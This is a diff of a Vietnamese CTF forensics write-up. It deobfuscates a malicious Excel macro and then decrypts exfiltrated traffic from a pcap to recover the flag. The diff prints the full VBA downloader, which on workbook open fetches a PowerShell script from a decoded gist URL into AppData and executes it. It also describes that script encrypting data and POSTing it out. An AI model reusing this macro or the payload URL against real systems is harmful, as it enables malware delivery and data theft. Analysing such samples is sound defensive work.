@@ -12,162 +12,147 @@ Vẫn là Hoà và tài liệu độc hại của anh ấy. Đề cho ta 1 file 
 
 Ta thấy đoạn malicious code này bị obfuscate khá đau mắt, tuy nhiên để ý thì có vẻ như nó chỉ bị obfu bằng xài mấy tên biến non-ascii kì cục :v 
 
-Mình code script đểu sau để nhìn VB code dễ hơn:
+Sử dụng cyberchef, mình sửa chay từng biến 1 :D và nhìn ra mặt code:
 
 ```
-with open("data.txt", "rb") as f:
-    data = f.read()
-#ascii 32-126.
-variablelist = []
-nonasc = []
-valuelist = []
-gapphay = False
-cmcheck = True
-final = ""
-
-for i in data:
-    if not gapphay:
-        if i == 10 or i == 13:
-            #Xử lí xuống dòng.
-            final += "\n"
-            continue
-
-        if i in range(32, 127):
-            if i == 34:
-                gapphay = True
-
-            tmpstr = ""
-            for j in nonasc:
-                tmpstr += str(j) + " "
-            variablelist.append(tmpstr)
-            final += tmpstr
-            nonasc = []
-            
-            final += chr(i)
-        else:
-            nonasc.append(i)
-    
-    else:
-        if i == 34:
-            for j in valuelist:
-                if j not in range(32, 127):
-                    cmcheck = False
-            if cmcheck:
-                for j in valuelist:
-                    final += chr(j)
-            else:
-                for j in valuelist:
-                    final += str(j) + " "
-            cmcheck = False
-            valuelist = []
-            gapphay = False
-            final += chr(i)
-        else:
-            valuelist.append(i)
-
-newl = []
-for i in variablelist:
-    if len(i) != 0:
-        newl.append(i)
-
-numb = 0
-for z in newl:
-    if z in final:
-        final = final.replace(z, f'var{str(numb)}')
-        numb += 1
-print(final)
-```
-
-Đầu ra của code trên sẽ replace hết tên biến trùng nhau về thành `var + số`. Còn những value không trùng thì mình để ở nguyên dạng decimal :v 
-
-Đầu ra của mình thế này:
-
-```
-Function var0(var1)
-var2 = "32 63 33 64 35 36 37 94 38 42 40 41 95 43 124 48 49 50 51 52 53 54 55 56 57 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 46 44 45 126 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 194 191 194 161 194 178 194 179 195 128 195 129 195 130 195 131 195 132 195 133 195 146 195 147 195 148 195 149 195 150 195 153 195 155 195 156 195 160 195 161 195 162 195 163 195 164 195 165 195 152 194 182 194 167 195 154 194 165 "
-var3 = "195 163 88 76 49 108 89 85 126 195 153 195 164 44 67 97 194 178 90 102 195 131 64 100 79 45 99 113 194 179 195 161 195 149 115 195 132 74 86 57 65 81 110 118 98 106 48 195 133 55 87 73 33 82 66 103 194 167 72 111 63 75 95 70 51 46 195 147 112 194 165 195 150 101 80 195 162 122 107 194 182 195 155 78 195 152 37 71 32 109 195 156 94 77 38 43 194 161 35 52 41 117 195 128 114 116 56 40 195 146 83 119 124 84 42 195 130 36 69 195 165 121 104 105 195 154 120 54 53 68 195 160 194 191 50 195 129 195 148 "
-For y = 1 To Len(var1)
-var4 = InStr(var2, Mid(var1, y, 1))
+Function func1(var17)
+var12 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
+var16 = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
+For y = 1 To Len(var17)
+var4 = InStr(var12, Mid(var17, y, 1))
 If var4 > 0 Then
-var5 = Mid(var3, var4, 1)
-var6 = var6 + 
-var5Else
-var6 = var6 + Mid(var1, y, 1)
+var11 = Mid(var16, var4, 1)
+var13 = var13 + var11
+Else
+var13 = var13 + Mid(var17, y, 1)
 End If
 Next
-var0 = 
-var6For var7 = 1 To Len(var8)
-var8 = 
-var7Next
-For var9 = 2 To Len(var10)
-var10 = 2
+func1 = var13
+For var26 = 1 To Len(var23)
+var23 = var26
 Next
-For var11 = 3 To Len(var12)
-var12 = 
-var11Next
-For var13 = 4 To Len(var14)
-var14 = 2
+For var30 = 2 To Len(var24)
+var24 = 2
+Next
+For var33 = 3 To Len(var28)
+var28 = var33
+Next
+For var18 = 4 To Len(var22)
+var22 = 2
 Next
 End Function
 Sub Workbook_Open()
-Dim var15 As Object
-Dim var16 As String
-Dim var17 As String
+Dim var31 As Object
+Dim var21 As String
+Dim var29 As String
+Dim var19 As String
+Dim var14 As Integer
+var14 = Chr(50) + Chr(48) + Chr(48)
+Set var31 = CreateObject("WScript.Shell")
+var21 = var31.SpecialFolders("AppData")
+Dim var9
+Dim var6
+Dim var3
+Dim var26 As Long
+Dim var30 As String
+Dim var25 As Long
+Dim var28 As String
+Dim var33 As Long
 Dim var18 As String
-Dim var19 As Integer
-var19 = Chr(50) + Chr(48) + Chr(48)
-Set var15 = CreateObject("87 83 99 114 105 112 116 46 83 104 101 108 108 ")
-var16 = var15.SpecialFolders("65 112 112 68 97 116 97 ")
-Dim 
-var20Dim 
-var21Dim 
-194 162 var4194 182 Dim var7 As Long
-Dim var9 As String
-Dim var22 As Long
-Dim var12 As String
-Dim var11 As Long
-Dim var13 As String
-Dim var23 As String
-Dim var10 As Long
-Dim 
-var24Dim 
-var25Dim var26 As Integer
-Dim 
-194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 Dim 
-194 174 194 172 194 174 194 171 194 187 194 183 194 187 194 162 194 182 194 182 194 191 194 174 194 171 194 190 194 162 194 183 194 179 194 167 194 189 194 191 194 164 194 189 194 191 194 167 194 161 194 188 194 171 194 188 194 180 194 170 194 179 194 178 194 172 194 184 194 174 194 186 194 188 194 164 194 188 194 172 194 191 194 165 194 167 194 183 194 171 194 180 194 161 194 164 194 180 194 189 194 168 194 181 194 163 194 179 194 175 194 189 194 176 194 178 194 170 194 178 194 181 194 186 194 180 194 169 194 164 194 163 194 164 194 161 194 189 194 175 194 170 194 184 194 175 194 191 194 166 194 164 194 162 194 167 194 184 194 174 194 188 194 179 194 168 194 166 194 182 194 168 194 165 194 179 194 176 194 169 var26 = 1
-Range("65 49 ").Value = var0("52 66 69 105 195 160 105 117 80 51 120 54 194 191 81 69 105 194 179 ")
-Dim var27 As String
-var28 = "36 120 194 191 80 195 156 95 106 69 80 107 69 69 105 80 195 156 95 54 73 69 51 80 95 105 51 80 195 155 120 194 191 194 178 80 195 160 81 66 120 194 178 194 179 95 105 194 179 80 51 120 54 194 191 81 69 105 194 179 98 80 195 156 95 106 69 80 107 69 69 105 80 98 194 179 120 35 69 105 114 " & vbCrLf & "195 146 120 80 194 178 69 194 179 194 178 195 160 69 106 69 80 194 179 195 156 69 98 69 80 51 95 194 179 95 40 80 195 155 120 194 191 80 95 194 178 69 80 194 178 69 55 194 191 195 160 194 178 69 51 80 194 179 120 80 194 179 194 178 95 105 98 48 69 194 178 80 64 109 109 73 80 194 179 120 80 194 179 195 156 69 80 48 120 35 35 120 195 132 195 160 105 117 80 107 95 105 73 80 95 54 54 120 194 191 105 194 179 80 105 194 191 81 107 69 194 178 58 80 " & vbCrLf & "64 109 64 109 64 109 111 64 64 194 167 109 109 109 " & vbCrLf & "103 54 54 120 194 191 105 194 179 80 195 156 120 35 51 69 194 178 58 80 76 117 194 191 195 155 69 105 80 195 146 195 156 95 105 195 156 80 33 120 105 117 " & vbCrLf & "116 95 105 73 58 80 84 116 80 116 95 105 73 "
-var27 = var0(var28)
-MsgBox var27, vbInformation, var0("112 69 80 51 69 69 66 35 195 155 80 194 178 69 117 194 178 69 194 179 80 194 179 120 80 195 160 105 48 120 194 178 81 80 195 155 120 194 191 ")
-Dim var29 As Date
-Dim var30 As Date
-var29 = Date
-var30 = DateSerial(2023, 6, 6)
-If var29 < var30 Then
-Set 194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178  = CreateObject("109 105 99 114 111 115 111 102 116 46 120 109 108 104 116 116 112 ")
-Set var25 = CreateObject("83 104 101 108 108 46 65 112 112 108 105 99 97 116 105 111 110 ")
-var24 = var16 + var0("92 107 194 191 105 54 195 156 95 126 66 98 64 ")
-194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .Open "103 101 116 ", var0("195 156 194 179 194 179 66 98 58 47 47 117 195 160 98 194 179 126 117 195 160 194 179 195 156 194 191 107 194 191 98 69 194 178 54 120 105 194 179 69 105 194 179 126 54 120 81 47 107 55 194 191 95 105 81 95 105 47 102 195 128 51 95 111 45 51 89 102 48 95 69 54 109 54 107 107 51 95 107 109 194 167 51 89 48 51 195 128 89 95 51 95 95 47 194 178 95 195 132 47 195 128 51 69 195 128 107 102 109 102 195 128 64 69 195 163 195 163 111 195 163 195 164 194 167 107 64 95 64 195 163 48 195 164 54 95 69 51 45 195 163 89 48 51 54 45 64 64 107 111 111 47 95 195 128 109 98 54 109 64 194 167 126 66 98 64 "), False
-194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .send
-var21 = 194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .responseBody
-If 194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .Status = 200 Then
-Set var20 = CreateObject("97 100 111 100 98 46 115 116 114 101 97 109 ")
-var20.Open
-var20.Type = 
-var26var20.Write 
-var21var20.SaveToFile var24, var26 + 
-var26var20.Close
+Dim var32 As String
+Dim var24 As Long
+Dim var10
+Dim var15
+Dim a0 As Integer
+Dim var2
+Dim var7
+a0 = 1
+Range("A1").Value = func1("4BEiàiuP3x6¿QEi³")
+Dim var8 As String
+var1 = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "ÒxP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiPÒÜ_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
+var8 = func1(var1)
+MsgBox var8, vbInformation, func1("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
+Dim var20 As Date
+Dim var27 As Date
+var20 = Date
+var27 = DateSerial(2023, 6, 6)
+If var20 < var27 Then
+Set var2 = CreateObject("microsoft.xmlhttp")
+Set var15 = CreateObject("Shell.Application")
+var10 = var21 + func1("\k¿i6Ü_~Bb@")
+var2.Open "get", func1("Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@"), False
+var2.send
+var6 = var2.responseBody
+If var2.Status = 200 Then
+Set var9 = CreateObject("adodb.stream")
+var9.Open
+var9.Type = a0
+var9.Write var6
+var9.SaveToFile var10, a0 + a0
+var9.Close
 End If
-var25.Open (var24)
+var15.Open (var10)
 Else
-MsgBox var0("195 165 120 105 39 194 179 80 194 179 194 178 195 155 80 194 179 120 80 194 178 194 191 105 80 81 69 80 107 194 178 120 ")
+MsgBox func1("åxi'³P³²ÛP³xP²¿iPQEPk²x")
 End If
 End Sub
 ```
 
-Đầu tiên với hàm `var0`, ta thấy nó nhận vào 1 chuỗi, trả về kí tự index thứ `var4` trên `var3`. `var4` là kết quả từ việc match xem kí tự lần đầu của chuỗi xuất hiện trong `var2` là ở đâu. Lặp liên tục trên len của chuỗi đầu vào, hàm trả về cho ta 1 string.
+Đầu tiên với hàm `func1`, ta thấy nó nhận vào 1 chuỗi, trả về kí tự index thứ `var4` trên `var16`. `var4` là kết quả từ việc match xem kí tự lần đầu của chuỗi xuất hiện trong `var12` là ở đâu. Lặp liên tục trên len của chuỗi đầu vào, hàm trả về cho ta 1 string.
 
-Code chỉ có 1 hàm duy nhất và được gọi đến cơ số lần :v, và cũng như đề cập trên, value duy nhất trong code mình để nguyên ở decimal. Ta tiến hành làm việc với mớ đó thôi.
+Func1 được gọi rất nhiều lần, mình viết code sau và decode từng đoạn gọi tới func1:
 
-Vì kí tự đặc biệt mình cũng không biết xử lý sao nữa, nên đành phải dò để copy value từ code VB gốc về :(
+```
+var2 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
+var3 = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
+v1 = input()
+
+out = ""
+for i in range(len(v1)):
+    if v1[i] == ':':
+        out += ':'
+    elif v1[i] =='/':
+        out += '/'
+    for j in range(len(var2)):
+        if var2[j] == v1[i]:
+            out += var3[j]
+print(out)
+```
+Lần lượt với chuỗi đầu vào func, ta được các output như sau:
+
+`Opening document`
+
+`We deeply regret to inform you`
+
+`buncha.ps1`
+
+`https://gist.githubusercontent.com/bquanman/98da73d49faec0cbbdab02d4fd84adaa/raw/8de8b90981e667652b1a16f5caed364fdc311b77/a80sc012.ps1`
+
+`Dont try to run me bro`
+
+Chung quy lại là code này thực thi việc tải xuống file ps1 kia và lưu vào Appdata. Vào đường dẫn mà file được tải xuống:
+
+![image](https://github.com/NVex0/uWU/assets/113530029/d4462edb-e086-40ed-9fde-5a9b91215a16)
+
+Vẫn là base64 và deflate compress :v, ta làm tương tự như đoạn đầu thôi, và được 1 obfuscated code khác. Mình sử dụng `PowerDecode` để deobfuscate. 
+
+Đoạn code sau khi deob nhìn khá rõ ràng. Cụ thể code này sử dụng AES-CBC Zero Padding với key có sẵn trong code. IV lấy 16 bytes nối với data sau khi encrypt. 
+Sau đó là tạo stream để POST data lên kết nối được thiết lập trước. 
+
+Vậy nên với file pcap của đề, mình sẽ tiến hành decrypt data mà Hoà lấy được từ máy thầy. Đầu tiên mình sort theo HTTP POST:
+
+![image](https://github.com/NVex0/uWU/assets/113530029/027fd81a-9998-42ca-8b0e-884402d47b91)
+
+Sau đó decrypt data bên client gửi bằng cách cắt đi 16 bytes đầu làm IV, key trong code và phần còn lại là encrypted data. Ta bắt đầu với stream nhiều data nhất trước:
+
+Phần data ta phải xử lý qua bằng URL decode trước. Sau đó mình decrypt với Cyberchef:
+
+![image](https://github.com/NVex0/uWU/assets/113530029/d604601b-c12e-4fa8-b734-0e33181b8bc2)
+
+Để ý thì kia là header của PNG, decode và save về, ta được 1 bức QR:
+
+![image](https://github.com/NVex0/uWU/assets/113530029/0449648b-a836-47b3-93db-c23d9185768a)
+
+Scan và ta được Flag:
+
+Flag: `CHH{D0n't_w0rRy_n0_st@r_wh3rE}`
